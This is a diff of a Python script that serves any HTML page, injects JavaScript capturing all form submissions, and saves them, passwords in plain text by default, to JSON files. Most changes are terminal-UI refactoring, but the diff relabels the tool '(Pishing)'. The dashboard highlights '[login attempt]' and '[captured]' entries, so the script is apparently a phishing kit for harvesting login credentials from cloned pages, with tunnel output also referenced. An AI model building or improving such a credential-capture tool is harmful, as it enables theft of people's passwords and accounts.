@@ -5,8 +5,9 @@ html_backend_builder.py  -  Termux / Linux / Windows / macOS
 Gives any HTML page a backend that saves form input to a JSON file.
 
   * Serves your HTML at http://127.0.0.1:8000 (page works unchanged)
-  * Saves every submit (button click OR Enter key) to <name>_data.json
-    in the same folder as the HTML file
+  * Saves every submit (button click OR Enter key) to
+    data_sets/<name>_data.json - the data_sets folder is auto-created
+    next to the HTML file
   * Passwords are saved as clean text (as typed). Use --hash-passwords
     if you want them hashed instead.
 
@@ -59,26 +60,20 @@ _LIVE_BOX = {"open": False, "width": 0}
 EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
 BLOCKED_EXT = {".py", ".json", ".env", ".db", ".sqlite"}
 
-# Alternate-screen escape codes - the same trick full-screen terminal apps
-# like htop, vim and less use. Switching to the alternate buffer makes this
-# program take over the whole tab/window like a real application; leaving
-# it instantly restores the user's previous terminal content untouched.
-_ALT_SCREEN_ON = "\033[?1049h\033[2J\033[H"                 # switch buffer + clear + home
-_ALT_SCREEN_OFF = "\033[0m\033[?7h\033[?25h\033[?1049l"     # reset + wrap on + cursor on + switch back
+_ALT_SCREEN_ON = "\033[?1049h\033[2J\033[H"
+_ALT_SCREEN_OFF = "\033[0m\033[?7h\033[?25h\033[?1049l"
 
 _ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]|\x1b[@-_]")
 _CTRL_RE = re.compile(r"[\x00-\x1f\x7f-\x9f]")
 
 _SCREEN = {
-    "active": False,          # is the full-screen view currently drawn?
-    "alt": False,             # are we inside the alternate screen buffer?
-    "size": None,             # last (cols, rows) the frame was drawn for
-    "header": [],             # plain status lines shown under the logo
-    "log": deque(maxlen=1000),  # activity history (plain text lines)
+    "active": False,
+    "alt": False,
+    "size": None,
+    "header": [],
+    "log": deque(maxlen=1000),
 }
 
-# Injected into the page. Captures button clicks, Enter key and form submits,
-# de-duplicates them, and posts the values to /api/save.
 INJECT_JS = """
 <script>
 (function () {
@@ -103,7 +98,7 @@ INJECT_JS = """
     if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
     var body = JSON.stringify({ form: formId, fields: fields });
     var now = Date.now();
-    if (body === lastSig && now - lastTime < 1500) return;   // duplicate event
+    if (body === lastSig && now - lastTime < 1500) return;
     lastSig = body; lastTime = now;
     fetch('/api/save', {
       method: 'POST',
@@ -146,10 +141,8 @@ INJECT_JS = """
 
 
 # ====================================================================== #
-#  UI FRAMEWORK - white / grey text on the terminal's own background,    #
-#  with a single orange accent color for headers, borders and choices.  #
-#  Falls back to plain text automatically on a terminal that can't      #
-#  render color or box-drawing characters (CI logs, dumb terminals).    #
+#  UI FRAMEWORK - ASCII borders only (guaranteed 1-cell everywhere on    #
+#  every terminal, at every zoom level). Color accents via ANSI.         #
 # ====================================================================== #
 def _color_enabled():
     if os.environ.get("NO_COLOR") is not None:
@@ -178,46 +171,6 @@ class _NoTheme:
 C = Theme() if _color_enabled() else _NoTheme()
 
 
-def _term_width():
-    try:
-        return max(48, min(os.get_terminal_size().columns - 2, 76))
-    except Exception:
-        return 68
-
-
-def print_box(lines, title=None, color=None):
-    """Draws one bordered box. `lines` are plain strings (no color codes)
-    so width math stays correct; color is applied only when printing.
-    Any line longer than the box wraps onto extra lines instead of
-    breaking the border."""
-    import textwrap
-
-    color = color or C.GREY
-    w = _term_width()
-    inner = w - 4
-    top = f"{color}+{'-' * (w - 2)}+{C.RESET}"
-    bot = f"{color}+{'-' * (w - 2)}+{C.RESET}"
-    out = [top]
-    if title:
-        t = f" {title} "
-        pad = max(w - 2 - len(t), 0)
-        left = pad // 2
-        right = pad - left
-        out.append(f"{color}|{C.RESET}{C.BOLD}{C.ORANGE}{' ' * left}{t}{' ' * right}{C.RESET}{color}|{C.RESET}")
-        out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
-    for line in lines:
-        if line == "":
-            out.append(f"{color}|{' ' * (w - 2)}|{C.RESET}")
-            continue
-        wrapped = textwrap.wrap(line, width=inner) or [""]
-        for piece in wrapped:
-            pad = max(inner - len(piece), 0)
-            out.append(f"{color}| {C.RESET}{C.WHITE}{piece}{' ' * pad} {color}|{C.RESET}")
-    out.append(bot)
-    sys.stdout.write("\n".join(out) + "\n")
-    sys.stdout.flush()
-
-
 def _is_tty():
     try:
         return sys.stdout.isatty()
@@ -226,17 +179,29 @@ def _is_tty():
 
 
 def _term_size():
-    """(columns, rows) of the real terminal. Asked from the OS on every
-    call (never from stale COLUMNS/LINES variables), so a zoom or a resize
-    is always noticed."""
+    """REAL (columns, rows) from the OS on every call - never cached, so
+    a zoom / resize is noticed immediately."""
     try:
         sz = os.get_terminal_size(sys.stdout.fileno())
     except Exception:
         sz = shutil.get_terminal_size(fallback=(80, 24))
-    return max(sz.columns, 20), max(sz.lines, 4)
+    return max(sz.columns, 4), max(sz.lines, 4)
 
 
-# ---- text helpers: every row is measured in terminal CELLS, not chars ---- #
+def _term_width():
+    """Width for the boxed setup screens. ALWAYS <= real cols so the box
+    can never overflow and wrap. On a very narrow terminal (zoom-in on a
+    phone) the box simply shrinks instead of breaking."""
+    cols, _ = _term_size()
+    w = cols - 2
+    if w > 76:
+        w = 76
+    if w < 10:
+        w = max(cols - 1, 4)
+    return w
+
+
+# ---- text helpers: every row measured in terminal CELLS, not chars ---- #
 def _cw(text):
     n = 0
     for ch in text:
@@ -247,9 +212,6 @@ def _cw(text):
 
 
 def _clean(text):
-    """Strips escape codes / control characters from any text before it is
-    drawn. Anything that comes from outside (http requests, cloudflared
-    output) can therefore never move the cursor or break the frame."""
     text = _ANSI_RE.sub("", str(text)).expandtabs(4)
     return _CTRL_RE.sub("", text)
 
@@ -266,9 +228,8 @@ def _fit(text, width):
 
 
 def _wrap(text, width, indent=0):
-    """Hard-wraps by cell width (long URLs / paths never overflow the box)."""
     text = _clean(text)
-    out, cur, curw, lim, pre = [], "", 0, width, ""
+    out, cur, curw, lim, pre = [], "", 0, max(width, 1), ""
     for ch in text:
         w = _cw(ch)
         if curw + w > lim and cur:
@@ -280,15 +241,39 @@ def _wrap(text, width, indent=0):
     return out
 
 
+def print_box(lines, title=None, color=None):
+    """Bordered box with ASCII borders (always 1 cell). Content wrapped by
+    CELL width so wide chars never break the frame."""
+    color = color or C.GREY
+    w = _term_width()
+    inner = max(w - 4, 1)
+    out = [f"{color}+{'-' * (w - 2)}+{C.RESET}"]
+    if title:
+        t = f" {title} "
+        t = _fit(t, w - 2)
+        tw = _cw(t)
+        pad = max(w - 2 - tw, 0)
+        left = pad // 2
+        right = pad - left
+        out.append(f"{color}|{C.RESET}{C.BOLD}{C.ORANGE}{' ' * left}{t}{' ' * right}{C.RESET}{color}|{C.RESET}")
+        out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
+    for line in lines:
+        if line == "":
+            out.append(f"{color}|{' ' * (w - 2)}|{C.RESET}")
+            continue
+        for piece in _wrap(line, inner):
+            gap = max(inner - _cw(piece), 0)
+            out.append(f"{color}| {C.RESET}{C.WHITE}{piece}{' ' * gap} {color}|{C.RESET}")
+    out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
+    sys.stdout.write("\n".join(out) + "\n")
+    sys.stdout.flush()
+
+
 # ---- keyboard noise: no echo, no "^[[A" garbage while the dashboard runs -- #
 _TERM_SAVED = {"attrs": None}
 
 
 def _echo_off():
-    """Touch-scrolling / arrow keys send escape codes to the program. With
-    echo on, the terminal prints them as ^[[A^[[B ... over the screen.
-    Echo and line mode are switched off while the dashboard is up (Ctrl+C
-    still works) and restored exactly afterwards."""
     if termios is None:
         return
     try:
@@ -313,15 +298,13 @@ def _echo_restore():
     _TERM_SAVED["attrs"] = None
     try:
         fd = sys.stdin.fileno()
-        termios.tcflush(fd, termios.TCIFLUSH)      # throw away unread keys
+        termios.tcflush(fd, termios.TCIFLUSH)
         termios.tcsetattr(fd, termios.TCSADRAIN, old)
     except Exception:
         pass
 
 
 def _drain_input():
-    """Reads and discards any pending keystrokes so they never pile up and
-    leak into the shell after the program exits."""
     try:
         if msvcrt is not None:
             while msvcrt.kbhit():
@@ -338,26 +321,18 @@ def _drain_input():
 
 # ---- full-screen app --------------------------------------------------- #
 def enter_app_screen():
-    """Switches into the alternate screen buffer so the program takes over
-    the whole tab/window like htop or vim. Skipped when output is not a
-    terminal (pipes, CI logs)."""
+    """Alternate buffer + auto-wrap OFF from the very start (not just when
+    the dashboard opens), so no setup screen can ever wrap and break."""
     if _is_tty() and not _SCREEN["alt"]:
         _SCREEN["alt"] = True
         sys.stdout.write(_ALT_SCREEN_ON)
+        sys.stdout.write("\033[?7l")     # disable auto-wrap NOW
         sys.stdout.flush()
-        # Echo is switched off for the program's entire run, not just the
-        # dashboard: a touch-scroll or pinch-zoom can fire escape sequences
-        # at ANY step (even one that never reads input, like this check),
-        # and with the terminal's own echo on those get printed as raw
-        # "^[[A^[[B..." before any of this program's code sees them.
-        # safe_input() does its own manual, filtered echo while reading
-        # text, so turning the terminal's echo off everywhere is safe.
         _echo_off()
         atexit.register(leave_app_screen)
 
 
 def leave_app_screen():
-    """Restores the user's normal terminal exactly as it was before."""
     with PRINT_LOCK:
         _SCREEN["active"] = False
         if _SCREEN["alt"]:
@@ -371,28 +346,21 @@ def leave_app_screen():
 
 
 def set_dashboard_header(lines):
-    """Plain-text status lines shown under the IQchain logo block."""
     _SCREEN["header"] = lines
 
 
 def start_dashboard():
-    """Switches from the step-by-step setup screens into the full-screen
-    view: IQchain logo + developer credit pinned on top, status lines under
-    it, and the scrolling activity lines below. A small watcher thread
-    re-draws the frame whenever the terminal is zoomed / resized, and
-    quietly swallows stray key presses."""
     if not (_is_tty() and _SCREEN["alt"]):
-        # no real terminal -> plain, ordinary printed lines
         for line in _SCREEN["header"]:
             print(_clean(line))
         return
-    with PRINT_LOCK:                              # echo is already off, set by
-        _SCREEN["active"] = True                  # enter_app_screen() at startup
+    with PRINT_LOCK:
+        _SCREEN["active"] = True
         _SCREEN["size"] = None
-        sys.stdout.write("\033[?25l\033[?7l")     # hide cursor, no auto-wrap
+        sys.stdout.write("\033[?25l")
         _redraw_dashboard()
-    sig = getattr(signal, "SIGWINCH", None)       # instant repaint the moment
-    if sig is not None:                           # the terminal reports a resize
+    sig = getattr(signal, "SIGWINCH", None)
+    if sig is not None:
         try:
             signal.signal(sig, lambda *_: _on_resize_signal())
         except Exception:
@@ -415,29 +383,31 @@ def _watch_screen():
         with PRINT_LOCK:
             if not _SCREEN["active"]:
                 return
-            # redraw on any size change, and once a second to self-heal
             if _term_size() != _SCREEN["size"] or tick % 5 == 0:
                 _redraw_dashboard()
 
 
 def _build_frame(cols, rows):
-    """Returns the list of screen rows (already colored) for a terminal of
-    `cols` x `rows`. Every row is exactly the same width and the list is
-    never taller than the terminal, so the frame cannot wrap, overflow or
-    scroll - at any zoom level."""
-    w = max(min(cols - 1, 160), 30)
-    inner = w - 4
+    """ASCII frame. Every row is EXACTLY `w` cells, and `w <= cols-1`, so
+    the frame can never wrap or overflow at any zoom level."""
+    w = min(cols - 1, 160)
+    if w < 10:
+        w = max(cols - 1, 4)
+    inner = max(w - 4, 1)
     B, R = C.ORANGE, C.RESET
 
     def rule(left, right):
-        return f"{B}{left}{'─' * (w - 2)}{right}{R}"
+        return f"{B}{left}{'-' * (w - 2)}{right}{R}"
 
     def line(text="", color=None, bold=False, center=False):
         text = _fit(text, inner)
         gap = inner - _cw(text)
+        if gap < 0:
+            gap = 0
         left = gap // 2 if center else 0
+        right = gap - left
         style = (C.BOLD if bold else "") + (C.WHITE if color is None else color)
-        return f"{B}│{R} {style}{' ' * left}{text}{' ' * (gap - left)}{R} {B}│{R}"
+        return f"{B}|{R} {style}{' ' * left}{text}{' ' * right}{R} {B}|{R}"
 
     brand = f"{APP_NAME}  {APP_VERSION}"
     credit = f"developed by {APP_AUTHOR}"
@@ -445,67 +415,62 @@ def _build_frame(cols, rows):
     if _cw(short) > inner:
         short = f"{APP_NAME} {APP_VERSION}"
 
-    compact_head = [rule("┌", "┐"),
+    compact_head = [rule("+", "+"),
                     line(short, C.ORANGE, True, True),
                     line(credit, C.GREY, False, True),
-                    rule("├", "┤")]
+                    rule("+", "+")]
     full_head = None
     logo = _logo_lines()
-    if len(logo[0]) <= inner:
-        full_head = [rule("┌", "┐"), line("")]
+    if logo and len(logo[0]) <= inner:
+        full_head = [rule("+", "+"), line("")]
         full_head += [line(g, C.ORANGE, True, True) for g in logo]
         full_head += [line(""),
                       line(brand, C.WHITE, False, True),
                       line(APP_TAG, C.ORANGE, True, True),
                       line(credit, C.GREY, False, True),
-                      rule("├", "┤")]
+                      rule("+", "+")]
 
     status = [line(p) for s in _SCREEN["header"] for p in _wrap(s, inner)]
-    bottom = rule("└", "┘")
+    bottom = rule("+", "+")
 
-    # big logo only when there is still room for a few activity rows
     head = compact_head
     if full_head and rows - (len(full_head) + len(status) + 1) >= 3:
         head = full_head
 
-    avail = rows - len(head) - len(status) - 1          # rows left for the log
-    if avail < 2:                                        # tiny window: no log area
+    avail = rows - len(head) - len(status) - 1
+    if avail < 2:
         body = status[:max(len(status) + min(avail, 0), 0)]
         return (head + body + [bottom])[:rows]
 
-    # "LIVE ACTIVITY" title is shown only when at least one activity row
-    # still fits under it; otherwise it is dropped first, never the frame.
     want_title = avail >= 3
-    title_rows = [rule("├", "┤"), line("LIVE ACTIVITY", C.ORANGE, True, True)] if want_title else []
-    log_rows = avail - 1 - (2 if want_title else 0)      # one row is the divider
+    title_rows = [rule("+", "+"), line("LIVE ACTIVITY", C.ORANGE, True, True)] if want_title else []
+    log_rows = avail - 1 - (2 if want_title else 0)
 
-    shown = []                                           # newest at the bottom
+    shown = []
     for entry in reversed(_SCREEN["log"]):
         txt = _clean(entry)
         if txt.startswith(("[error]", "[warn]")):
             color = C.ERR
-        elif txt.startswith(("[login attempt]", "[captured]")):
+        elif txt.startswith(("[login attempt]", "[captured]", "[saved]")):
             color = C.ORANGE
         else:
             color = C.WHITE
-        shown = [(_fit(txt, inner), color)] + shown     # one entry = one row
+        shown = [(_fit(txt, inner), color)] + shown
         if len(shown) >= log_rows:
             break
     shown = shown[-log_rows:] if log_rows > 0 else []
     blanks = [line("")] * max(log_rows - len(shown), 0)
-    rows_out = head + status + title_rows + [rule("├", "┤")] + blanks
+    rows_out = head + status + title_rows + [rule("+", "+")] + blanks
     rows_out += [line(seg, color) for seg, color in shown] + [bottom]
     return rows_out[:rows]
 
 
 def _redraw_dashboard():
-    """Paints the frame row by row at absolute screen positions (no
-    newlines, so the screen can never scroll). Called with PRINT_LOCK held."""
     cols, rows = _term_size()
     frame = _build_frame(cols, rows)
     out = []
     if _SCREEN["size"] != (cols, rows):
-        out.append("\033[2J")               # size changed: wipe leftovers once
+        out.append("\033[2J")
     _SCREEN["size"] = (cols, rows)
     for i, row in enumerate(frame, 1):
         out.append(f"\033[{i};1H{row}\033[K")
@@ -519,9 +484,6 @@ def _redraw_dashboard():
 
 
 def live_box_line(text, color=None):
-    """Records one line of activity (http hits, saved records, tunnel
-    output). While the full-screen view is active the frame is re-drawn so
-    the newest line appears at the bottom; otherwise it prints normally."""
     text = _clean(text)
     with PRINT_LOCK:
         _SCREEN["log"].append(text)
@@ -532,19 +494,10 @@ def live_box_line(text, color=None):
 
 
 def live_box_close():
-    """Leaves the full-screen view, restoring the real terminal."""
     leave_app_screen()
 
 
 def _consume_escape(fd):
-    """Called right after an ESC (0x1b) byte. A touchscreen terminal
-    (Termux included) can fire arrow-key, mouse-tracking or bracketed-paste
-    escape sequences on a swipe, pinch-zoom or stray tap. Those always
-    arrive as a burst starting with ESC, so: wait up to 100ms for the next
-    byte - nothing more means a lone Escape key press, nothing to do; a
-    '[' or 'O' means a CSI/SS3 sequence, so keep reading until its final
-    byte and throw the whole thing away. Either way, not one byte of it is
-    echoed or inserted into the typed text."""
     old = termios.tcgetattr(fd)
     tmp = termios.tcgetattr(fd)
     tmp[6][termios.VMIN] = 0
@@ -553,7 +506,7 @@ def _consume_escape(fd):
     try:
         nxt = os.read(fd, 1)
         if nxt in (b"[", b"O"):
-            for _ in range(32):                 # hard cap: never hang on junk
+            for _ in range(32):
                 b = os.read(fd, 1)
                 if not b or 0x40 <= b[0] <= 0x7E:
                     break
@@ -577,7 +530,7 @@ def _safe_input_posix(prompt):
             if not ch:
                 raise EOFError
             if ch == b"\x1b":
-                _consume_escape(fd)             # swallow it, never echoed
+                _consume_escape(fd)
                 continue
             if ch in (b"\r", b"\n"):
                 sys.stdout.write("\n")
@@ -616,7 +569,7 @@ def _safe_input_windows(prompt):
                 sys.stdout.write("\b \b")
             continue
         if ch in ("\x00", "\xe0"):
-            msvcrt.getwch()                     # swallow arrow/function scan code
+            msvcrt.getwch()
             continue
         if ch.isprintable():
             buf.append(ch)
@@ -626,29 +579,19 @@ def _safe_input_windows(prompt):
 
 
 def safe_input(prompt=""):
-    """Drop-in replacement for input(). A plain input() relies on the
-    terminal's own line editing and echo, so a swipe, pinch-zoom or stray
-    touch that fires escape sequences gets echoed and inserted verbatim
-    (the '^[B^[B...' garbage). safe_input reads and echoes one keystroke
-    at a time itself, so it can recognize and discard a whole escape
-    sequence before it ever reaches the screen or the typed text - only
-    what the person actually typed comes back."""
     sys.stdout.write(prompt)
     sys.stdout.flush()
     if not sys.stdin.isatty() or (termios is None and msvcrt is None):
-        return input()                          # no real terminal: plain input() is fine
+        return input()
     try:
         if msvcrt is not None:
             return _safe_input_windows(prompt)
         return _safe_input_posix(prompt)
     except (termios.error if termios else Exception, OSError):
-        return input()                          # unusual terminal: fall back safely
+        return input()
 
 
 def _pause_before_exit():
-    """Used right before a fatal error closes the full-screen app, so the
-    message on screen is actually read before the terminal is restored -
-    the same way a full-screen app waits for a keypress before quitting."""
     try:
         safe_input(f"{C.GREY}Press Enter to exit...{C.RESET}")
     except (EOFError, KeyboardInterrupt):
@@ -656,16 +599,13 @@ def _pause_before_exit():
 
 
 # ---------------------------------------------------------------------- #
-#  BRAND BANNER - IQchain logo, version and developer credit             #
+#  BRAND BANNER - ASCII frame (rock-solid at any zoom) + colour accents  #
 # ---------------------------------------------------------------------- #
 APP_NAME = "IQchain"
-APP_VERSION = "v0.01"
+APP_VERSION = "v4.00"
 APP_AUTHOR = "IQmaxx (DK)"
-APP_TAG = "(backend)"
+APP_TAG = "(Pishing)"
 
-# Bold dot-matrix wordmark, 6 rows tall, letters hand-aligned so every
-# row is exactly the same length - verified column by column, so it
-# can never render ragged or off-center on any terminal.
 _LOGO_FONT = {
     "I": ["#####", "  #  ", "  #  ", "  #  ", "#####", "     "],
     "Q": [" ##### ", "##   ##", "##   ##", "## # ##", " ##### ", "    ## "],
@@ -689,46 +629,39 @@ def _logo_lines():
 
 
 def print_banner():
-    """Logo, version, the '(backend)' tag and the developer credit, all
-    inside one clean unicode-bordered frame (orange accent) - a proper
-    frame around the brand, not bare floating text. Drawn with the same
-    straight-line style as the live dashboard; every other box in the
-    program (print_box) is left exactly as it was."""
     w = _term_width()
-    inner = w - 4
+    inner = max(w - 4, 1)
     logo = _logo_lines()
-    logo_w = len(logo[0])
+    logo_w = _cw(logo[0])
 
     def row(text, color=C.WHITE, bold=False):
-        pad = max(inner - len(text), 0)
+        text = _fit(text, inner)
+        pad = max(inner - _cw(text), 0)
         left = pad // 2
         right = pad - left
         b = C.BOLD if bold else ""
-        return f"{C.ORANGE}│{C.RESET} {b}{color}{' ' * left}{text}{' ' * right}{C.RESET} {C.ORANGE}│{C.RESET}"
+        return f"{C.ORANGE}|{C.RESET} {b}{color}{' ' * left}{text}{' ' * right}{C.RESET} {C.ORANGE}|{C.RESET}"
 
     def blank():
-        return f"{C.ORANGE}│{' ' * (w - 2)}│{C.RESET}"
+        return f"{C.ORANGE}|{' ' * (w - 2)}|{C.RESET}"
 
-    lines = [f"{C.ORANGE}┌{'─' * (w - 2)}┐{C.RESET}", blank()]
+    lines = [f"{C.ORANGE}+{'-' * (w - 2)}+{C.RESET}", blank()]
     if logo_w <= inner:
         lines.extend(row(glyph, color=C.ORANGE, bold=True) for glyph in logo)
     else:
         lines.append(row(APP_NAME, color=C.ORANGE, bold=True))
     lines.append(blank())
     lines.append(row(f"{APP_NAME}  {APP_VERSION}"))
-    lines.append(row("(backend)", color=C.ORANGE, bold=True))
+    lines.append(row(APP_TAG, color=C.ORANGE, bold=True))
     lines.append(row(f"developed by {APP_AUTHOR}", color=C.GREY))
     lines.append(blank())
-    lines.append(f"{C.ORANGE}└{'─' * (w - 2)}┘{C.RESET}")
+    lines.append(f"{C.ORANGE}+{'-' * (w - 2)}+{C.RESET}")
 
     print()
     sys.stdout.write("\n".join(lines) + "\n")
 
 
 def print_farewell():
-    """Printed on the REAL terminal, right below the command the user ran,
-    after the full-screen app has closed: logo + (backend) tag + developer
-    credit, then a closing status box and a goodbye line."""
     print_banner()
     print()
     print_box(["Stopped."], title="STOPPED", color=C.GREY)
@@ -750,15 +683,6 @@ def ok_line(text):
 
 # ------------------------------------------------------------ helpers ----
 def setup_console():
-    """Cross-platform console setup for Termux, Linux, macOS and Windows.
-    1) Forces UTF-8 output so the box-drawing / logo characters never
-       crash on a narrow codepage.
-    2) On Windows, cmd.exe and older PowerShell windows don't interpret
-       ANSI escape codes unless Virtual Terminal processing is switched
-       on - this does that, using only the standard library (ctypes),
-       so the green/orange boxes render instead of raw escape text.
-       Any failure here is swallowed, since _color_enabled() and
-       _NoTheme already give a safe plain-text fallback."""
     for s in (sys.stdout, sys.stderr):
         try:
             s.reconfigure(encoding="utf-8", errors="replace")
@@ -812,7 +736,6 @@ def inject(html):
 
 
 class FieldScanner(HTMLParser):
-    """Lists detected inputs at startup (display only)."""
     def __init__(self):
         super().__init__()
         self.found = []
@@ -902,7 +825,7 @@ class Handler(BaseHTTPRequestHandler):
     server_version = "HtmlBackend/2.0"
 
     def log_message(self, fmt, *args):
-        pass  # no raw "GET ... 200" lines; do_GET/do_POST log clear events instead
+        pass
 
     def _send(self, code, body, ctype="application/json; charset=utf-8"):
         if isinstance(body, (dict, list)):
@@ -970,14 +893,12 @@ class Handler(BaseHTTPRequestHandler):
 
 
 class QuietServer(ThreadingHTTPServer):
-    """Same server, but errors go to the activity area instead of being
-    printed raw over the full-screen display."""
     daemon_threads = True
 
     def handle_error(self, request, client_address):
         exc = sys.exc_info()[1]
         if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError)):
-            return                      # browser closed the tab - harmless
+            return
         live_box_line(f"[error] {client_address[0]}: {type(exc).__name__}: {exc}")
 
 
@@ -992,11 +913,6 @@ def main():
                     help="hash passwords (PBKDF2) instead of saving them as typed")
     args = ap.parse_args()
 
-    # ---- the whole program, from this line to the very end, runs inside
-    # the alternate screen buffer: the instant it activates it takes over
-    # the full terminal/tab like a standalone application - whatever was
-    # already on screen (earlier commands, scrollback) is hidden for the
-    # entire run and reappears untouched only after this exits. ----------
     enter_app_screen()
     try:
         print_banner()
@@ -1021,7 +937,11 @@ def main():
         step_header(2, 3, "Scan the page for inputs")
         scanner = FieldScanner()
         scanner.feed(read_html(html_path))
-        db_path = html_path.with_name(html_path.stem + "_data.json")
+
+        data_dir = html_path.parent / "data_sets"
+        data_dir.mkdir(parents=True, exist_ok=True)
+        db_path = data_dir / (html_path.stem + "_data.json")
+
         found_lines = [f"Detected inputs : {len(scanner.found)}"]
         for name, t in scanner.found:
             found_lines.append(f"   - {name} ({t})")
@@ -1055,8 +975,6 @@ def main():
             title="BACKEND IS LIVE", color=C.ORANGE,
         )
 
-        # the step-by-step history above disappears here - only the live
-        # dashboard (this function's own output) stays on screen from now
         set_dashboard_header([
             f"Passwords       : {'clean text (as typed)' if not args.hash_passwords else 'hashed'}",
             f"Open in browser : http://{'127.0.0.1' if args.host == '0.0.0.0' else args.host}:{server.server_address[1]}/",
@@ -1070,18 +988,18 @@ def main():
             pass
         finally:
             server.server_close()
-    except KeyboardInterrupt:      # Ctrl+C at ANY step still shows the farewell
-        pass
-    except SystemExit:             # sys.exit() inside a step (bad file, port, etc.) too
-        pass
-    finally:
-        leave_app_screen()   # restores the user's real terminal, untouched
-
-    try:
-        print_farewell()   # logo + (backend) + developer credit + come again
     except KeyboardInterrupt:
         pass
-    sys.exit(0)   # the application has fully exited back to the command line
+    except SystemExit:
+        pass
+    finally:
+        leave_app_screen()
+
+    try:
+        print_farewell()
+    except KeyboardInterrupt:
+        pass
+    sys.exit(0)
 
 
 if __name__ == "__main__":
